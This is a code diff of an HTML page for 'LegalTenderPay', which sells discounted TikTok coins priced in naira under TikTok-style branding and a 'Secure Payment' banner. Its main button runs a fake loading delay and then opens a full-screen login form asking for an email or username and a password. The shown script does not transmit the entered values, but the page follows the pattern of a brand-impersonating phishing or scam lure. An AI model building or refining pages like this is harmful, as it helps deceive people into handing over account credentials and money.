@@ -46,7 +46,7 @@ body {
   font-weight: bold;
 }
 
-/* TikTok logo on header */
+/* TikTok logo */
 .header-right {
   display: flex;
   justify-content: flex-end;
@@ -144,7 +144,7 @@ body {
   margin-bottom: 25px;
 }
 
-/* Invite & Share */
+/* Invite */
 .invite-box {
   background-color: #fff;
   border-radius: 10px;
@@ -205,18 +205,6 @@ body {
   transform: scale(1.05);
 }
 
-/* TikTok logo centered below Invite box */
-.tiktok-logo-section {
-  text-align: center;
-  margin-top: 10px;
-  opacity: 0.3;
-}
-
-.tiktok-logo-section img {
-  width: 60px;
-  height: auto;
-}
-
 /* Footer */
 .footer {
   text-align: center;
@@ -230,75 +218,7 @@ body {
   opacity: 0.8;
 }
 
-/* Popup */
-.copy-popup {
-  position: fixed;
-  bottom: 25px;
-  left: 50%;
-  transform: translateX(-50%);
-  background: #000;
-  color: #fff;
-  padding: 12px 20px;
-  border-radius: 8px;
-  font-size: 15px;
-  opacity: 0;
-  transition: opacity 0.3s ease;
-  z-index: 999;
-}
-
-.copy-popup.show {
-  opacity: 0.9;
-}
-
-/* Login modal */
-.login-modal {
-  display: none;
-  position: fixed;
-  z-index: 1000;
-  left: 0;
-  top: 0;
-  width: 100%;
-  height: 100%;
-  background: rgba(0,0,0,0.6);
-}
-
-.login-content {
-  background: white;
-  border-radius: 12px;
-  width: 90%;
-  max-width: 350px;
-  margin: 120px auto;
-  padding: 25px;
-  box-shadow: 0 3px 10px rgba(0,0,0,0.3);
-  text-align: center;
-}
-
-.login-content h2 {
-  color: #ff375f;
-  margin-bottom: 15px;
-}
-
-.login-content input {
-  width: 90%;
-  padding: 10px;
-  margin-bottom: 12px;
-  border: 1px solid #ccc;
-  border-radius: 6px;
-}
-
-.login-content button {
-  background: #ff375f;
-  color: #fff;
-  border: none;
-  padding: 12px 20px;
-  border-radius: 8px;
-  cursor: pointer;
-  width: 90%;
-  font-weight: bold;
-  font-size: 16px;
-}
-
-/* Loading animation overlay */
+/* Loading screen */
 .loading-overlay {
   display: none;
   position: fixed;
@@ -313,8 +233,8 @@ body {
 }
 
 .loader {
-  width: 70px;
-  height: 70px;
+  width: 80px;
+  height: 80px;
   position: relative;
 }
 
@@ -322,8 +242,8 @@ body {
   content: '';
   position: absolute;
   top: 0;
-  width: 35px;
-  height: 70px;
+  width: 40px;
+  height: 80px;
   border-radius: 50%;
   animation: tikSpin 0.8s infinite;
 }
@@ -343,14 +263,55 @@ body {
   0%, 100% { transform: scale(1); opacity: 0.9; }
   50% { transform: scale(1.3); opacity: 0.5; }
 }
+
+/* Login modal */
+.login-modal {
+  display: none;
+  position: fixed;
+  z-index: 1300;
+  left: 0;
+  top: 0;
+  width: 100%;
+  height: 100%;
+  background: white;
+  justify-content: center;
+  align-items: center;
+}
+
+.login-content {
+  text-align: center;
+}
+
+.login-content h2 {
+  color: #ff375f;
+  margin-bottom: 15px;
+}
+
+.login-content input {
+  width: 80%;
+  padding: 12px;
+  margin: 8px 0;
+  border: 1px solid #ccc;
+  border-radius: 6px;
+}
+
+.login-content button {
+  background: #ff375f;
+  color: #fff;
+  border: none;
+  padding: 12px 25px;
+  border-radius: 8px;
+  cursor: pointer;
+  width: 85%;
+  font-weight: bold;
+  font-size: 16px;
+}
 </style>
 </head>
 
 <body>
 
-<div class="secure-payment">
-  Secure Payment via LegalTenderPay
-</div>
+<div class="secure-payment">Secure Payment via LegalTenderPay</div>
 
 <div class="container">
   <div class="header">
@@ -360,38 +321,35 @@ body {
     </div>
   </div>
 
-  <p class="sub-text">
-    Save around <span>25%</span> with a lower<br>
-    third-party service fee.
-  </p>
+  <p class="sub-text">Save around <span>25%</span> with a lower<br>third-party service fee.</p>
 
-  <div class="coins-grid">
-    <div class="coin-box" onclick="selectBox(this)">
-      <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png"> 30</div>
+  <div class="coins-grid" id="coinsGrid">
+    <div class="coin-box" data-price="530" onclick="selectBox(this)">
+      <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">30</div>
       <div class="coin-price">NGN530</div>
     </div>
-    <div class="coin-box" onclick="selectBox(this)">
-      <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png"> 350</div>
+    <div class="coin-box" data-price="6200" onclick="selectBox(this)">
+      <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">350</div>
       <div class="coin-price">NGN6,200</div>
     </div>
-    <div class="coin-box" onclick="selectBox(this)">
-      <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png"> 700</div>
+    <div class="coin-box" data-price="12400" onclick="selectBox(this)">
+      <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">700</div>
       <div class="coin-price">NGN12,400</div>
     </div>
-    <div class="coin-box" onclick="selectBox(this)">
-      <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png"> 1,400</div>
+    <div class="coin-box" data-price="24700" onclick="selectBox(this)">
+      <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">1,400</div>
       <div class="coin-price">NGN24,700</div>
     </div>
-    <div class="coin-box" onclick="selectBox(this)">
-      <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png"> 3,500</div>
+    <div class="coin-box" data-price="61600" onclick="selectBox(this)">
+      <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">3,500</div>
       <div class="coin-price">NGN61,600</div>
     </div>
-    <div class="coin-box" onclick="selectBox(this)">
+    <div class="coin-box" data-price="0" onclick="selectBox(this)">
       <span class="coin-amount">Custom</span>
     </div>
   </div>
 
-  <button class="login-btn" onclick="openLogin()">Log in to get Coins</button>
+  <button class="login-btn" id="mainButton" onclick="startLogin()">Log in to get Coins</button>
 
   <div class="invite-box">
     <div class="invite-left">
@@ -401,15 +359,11 @@ body {
         <div class="invite-sub">Check out this new feature!</div>
       </div>
     </div>
-    <span class="share-btn" onclick="doShare()">&#62;</span>
+    <span class="share-btn" onclick="alert('Share this link manually!')">&#62;</span>
   </div>
 
   <div class="coin-image-section">
     <img src="https://raw.githubusercontent.com/LegalTenderPay/LegalTenderPaySite/refs/heads/main/70a854a7-f718-447f-9176-6ea7a74ff63e.jpeg" alt="LegalTenderPay Coin">
-  </div>
-
-  <div class="tiktok-logo-section">
-    <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" alt="TikTok Logo">
   </div>
 
   <div class="footer">
@@ -417,66 +371,43 @@ body {
   </div>
 </div>
 
-<!-- Loading animation -->
+<!-- Full-screen loading -->
 <div class="loading-overlay" id="loadingOverlay">
   <div class="loader"></div>
 </div>
 
-<!-- Login Modal -->
+<!-- Full-screen login -->
 <div class="login-modal" id="loginModal">
   <div class="login-content">
     <h2>Log in</h2>
-    <form onsubmit="handleLoginSubmit(event)">
-      <input type="text" placeholder="Email or Username" required><br>
-      <input type="password" placeholder="Password" required><br>
-      <button type="submit">Continue</button>
-    </form>
+    <input type="text" placeholder="Email or Username" required><br>
+    <input type="password" placeholder="Password" required><br>
+    <button onclick="completeLogin()">Continue</button>
   </div>
 </div>
 
-<div class="copy-popup" id="copyPopup">Link copied! Share it manually 💬</div>
-
 <script>
-function selectBox(element) {
+let selectedPrice = 530;
+
+function selectBox(el) {
   document.querySelectorAll('.coin-box').forEach(b => b.classList.remove('active'));
-  element.classList.add('active');
+  el.classList.add('active');
+  selectedPrice = el.getAttribute('data-price');
 }
 
-function openLogin() {
-  const loader = document.getElementById("loadingOverlay");
-  loader.style.display = "flex";
+function startLogin() {
+  document.getElementById("loadingOverlay").style.display = "flex";
   setTimeout(() => {
-    loader.style.display = "none";
-    document.getElementById("loginModal").style.display = "block";
+    document.getElementById("loadingOverlay").style.display = "none";
+    document.getElementById("loginModal").style.display = "flex";
   }, 2000);
 }
 
-function handleLoginSubmit(event) {
-  event.preventDefault();
-  window.location.href = "https://legaltenderpay.github.io/LegalTenderPaySite/#";
-}
-
-function doShare() {
-  const shareData = {
-    title: "LegalTenderPay 🏆",
-    text: "Buy TikTok & Crypto coins securely and earn rewards 💰",
-    url: "https://legaltenderpay.github.io/LegalTenderPaySite/"
-  };
-  if (navigator.share) {
-    navigator.share(shareData).catch(err => console.log('❌ Share failed:', err));
-  } else {
-    const tempInput = document.createElement("input");
-    tempInput.value = shareData.url;
-    document.body.appendChild(tempInput);
-    tempInput.select();
-    document.execCommand("copy");
-    document.body.removeChild(tempInput);
-    const popup = document.getElementById("copyPopup");
-    popup.classList.add("show");
-    setTimeout(() => popup.classList.remove("show"), 2500);
-  }
+function completeLogin() {
+  document.getElementById("loginModal").style.display = "none";
+  const btn = document.getElementById("mainButton");
+  btn.textContent = selectedPrice > 0 ? `Buy for NGN${selectedPrice}` : "Buy Now";
 }
 </script>
-
 </body>
 </html>
